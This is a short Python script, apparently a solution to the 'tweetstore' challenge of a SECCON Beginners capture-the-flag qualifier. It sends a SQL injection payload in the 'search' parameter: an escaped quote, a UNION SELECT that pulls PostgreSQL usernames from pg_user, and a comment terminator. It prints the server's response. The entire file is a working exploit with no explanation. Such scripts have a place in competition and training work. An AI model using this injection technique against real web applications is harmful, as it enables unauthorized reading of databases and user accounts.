import requests


if __name__ == '__main__':
    search = "\\' union select usename as url, usename as text, now() as tweeted_at from pg_user --"
    limit = ''
    r = requests.get('https://tweetstore.quals.beginners.seccon.jp/', params={'search': search, 'limit': limit})
    body = r.content.decode()
    print(body)
